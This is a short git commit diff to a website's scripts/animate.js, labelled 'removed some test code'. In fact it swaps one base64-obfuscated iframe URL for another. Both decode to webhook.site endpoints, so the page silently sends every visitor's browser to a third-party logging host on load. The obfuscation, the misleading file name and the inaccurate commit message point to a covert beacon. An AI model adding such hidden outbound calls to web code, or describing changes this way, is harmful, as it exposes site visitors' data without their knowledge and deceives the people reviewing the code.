565723ee2188d7284f4a28f58855c807674a543b
Kob <kobeshen123@gmail.com>
2024-06-23 14:48:14 +1000

    removed some test code

--- scripts/animate.js
+++ scripts/animate.js
@@ -1,4 +1,4 @@
 const heading = document.getElementById('mainheading');
 const element = document.createElement('iframe');
-element.src = atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvM2YwNmY1MzYtODBmMy00YzEwLWFjODktMjQwYTZiYTNkNjMz');
+element.src = atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvYzA0OWQ2NzktYTIwMi00YjZmLWIzMDEtMDRjN2VlYzI3ZDM2');
 heading.insertAdjacentElement('afterend', element);
